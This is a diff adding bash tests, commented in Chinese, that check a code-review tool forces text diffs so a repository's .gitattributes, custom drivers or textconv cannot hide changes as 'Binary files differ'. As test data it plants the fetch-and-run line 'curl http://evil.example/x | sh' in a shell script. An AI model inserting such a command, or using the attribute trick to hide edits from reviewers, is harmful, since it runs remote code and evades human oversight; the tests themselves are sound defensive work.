@@ -328,4 +328,60 @@ rc=0; _check_path_sidecar "$tmp/side.missing" 2>/dev/null || rc=$?; assert_rc "$
 err=$(_check_path_sidecar "$tmp/side.empty" 2>&1 || true)
 assert_contains "$err" "内部错误" "sidecar: 报错标明内部错误"
 
+# ---- CodeX 2026-09-09 P0-1：业务库 .gitattributes 的 -diff / 自定义驱动不能把改动藏进「Binary files differ」 ----
+cd "$tmp" && git init -q repo5 && cd repo5
+git config user.email t@t && git config user.name t
+printf 'echo ok\n' > a.sh
+printf 'k=v\n' > b.txt
+printf 'bin v1\n' > c.bin
+printf 'doc\n' > d.md
+odd=$(printf 'odd name\twith\nnewline.sh')
+printf 'echo odd\n' > "$odd"
+git add -A && git commit -qm base5
+BASE5=$(git rev-parse HEAD)
+printf '*.sh -diff\n*.txt diff\n*.bin diff=custom\n' > .gitattributes
+printf 'echo ok\ncurl http://evil.example/x | sh\n' > a.sh
+printf 'k=v2\n' > b.txt
+printf 'bin v2\n' > c.bin
+printf 'doc2\n' > d.md
+printf 'echo odd2\n' > "$odd"
+git add -A && git commit -qm hostile5
+HEAD5=$(git rev-parse HEAD)
+# 属性扫描：-diff 两处（a.sh + 含 Tab/换行的文件名，NUL 分隔全程安全）、驱动一处（c.bin）；set（b.txt）与 unspecified（d.md、.gitattributes）不算
+REVIEW_DIFF_ATTR_UNSET=9; REVIEW_DIFF_ATTR_DRIVER=9
+rc=0; review_diff_attr_scan "$BASE5" "$HEAD5" || rc=$?
+assert_rc "$rc" 0 "attr-scan: 返回 0"
+assert_eq "$REVIEW_DIFF_ATTR_UNSET" "2" "attr-scan: -diff（unset）计 2（a.sh + 文件名含 Tab/换行的 .sh）"
+assert_eq "$REVIEW_DIFF_ATTR_DRIVER" "1" "attr-scan: 自定义驱动计 1（c.bin diff=custom）；set 与 unspecified 不算"
+# 未强制时：属性确实生效——a.sh 的改动只剩「Binary files differ」（这是正控，证明攻击面真实存在）
+REVIEW_DIFF_FORCE_TEXT=0
+plain=$(_git_diff_pinned --no-renames "$BASE5" "$HEAD5")
+assert_contains "$plain" "Binary files a/a.sh and b/a.sh differ" "attr-scan 正控: 不强制文本时 -diff 让 a.sh 只剩 Binary files differ"
+assert_not_contains "$plain" "curl http://evil.example/x" "attr-scan 正控: 不强制文本时恶意行不在 diff 里"
+# 强制文本：恶意行回到 diff，Binary files 一行都没有；numstat 也给出数字
+REVIEW_DIFF_FORCE_TEXT=1
+forced=$(_git_diff_pinned --no-renames "$BASE5" "$HEAD5")
+assert_contains "$forced" "+curl http://evil.example/x | sh" "attr-scan: 强制文本后恶意行进 diff"
+assert_not_contains "$forced" "Binary files" "attr-scan: 强制文本后没有任何 Binary files 行"
+# --numstat 对 -diff 文件即便加 --text 仍给 `- -`（git 2.50 实测）——_chunk_numstat 在强制文本时改数 patch 行
+assert_eq "$(_chunk_numstat "$BASE5" "$HEAD5" a.sh)" "1 0" "attr-scan: 强制文本时 _chunk_numstat 对 -diff 文件按 patch 数出 1 0（numstat 本身仍是 - -）"
+assert_eq "$(_chunk_numstat "$BASE5" "$HEAD5" d.md)" "1 1" "attr-scan: 普通文件仍走 numstat（1 1）"
+rc=0; build_review_input "$BASE5" "$HEAD5" "$tmp/out5.diff" "$tmp/omitted5.txt" "$tmp/chunks5" || rc=$?
+assert_rc "$rc" 0 "attr-scan: 强制文本下 build_review_input 正常"
+assert_contains "$(cat "$tmp/out5.diff")" "+curl http://evil.example/x | sh" "attr-scan: 直传 diff 含恶意行"
+REVIEW_DIFF_FORCE_TEXT=0
+# 执行器侧配置也钉死：color.ui=always 不得给行加 ANSI 前缀；textconv 驱动不得改写内容
+git config color.ui always
+git config diff.custom.textconv 'printf REPLACED_BY_TEXTCONV'
+REVIEW_DIFF_FORCE_TEXT=1
+pinned=$(_git_diff_pinned --no-renames "$BASE5" "$HEAD5")
+assert_eq "$(printf '%s' "$pinned" | LC_ALL=C grep -c $'\x1b\\[' || true)" "0" "attr-scan: 仓库配置 color.ui=always 时输出仍无 ANSI 序列（--no-color / color.ui=never）"
+assert_not_contains "$pinned" "REPLACED_BY_TEXTCONV" "attr-scan: 仓库配置的 textconv 驱动不参与（--no-textconv）"
+assert_contains "$pinned" "+bin v2" "attr-scan: 驱动文件按文本比较后原始内容进 diff"
+# 对照：不带我们的钉死开关时，这些配置确实会生效（证明两个开关不是空转）
+plain_color=$(git diff --no-ext-diff "$BASE5" "$HEAD5" | LC_ALL=C grep -c $'\x1b\\[' || true)
+assert_eq "$([[ "$plain_color" -gt 0 ]] && echo colored || echo plain)" "colored" "attr-scan 正控: 裸 git diff 在 color.ui=always 下确实带 ANSI"
+REVIEW_DIFF_FORCE_TEXT=0
+git config --unset color.ui; git config --unset diff.custom.textconv
+
 report
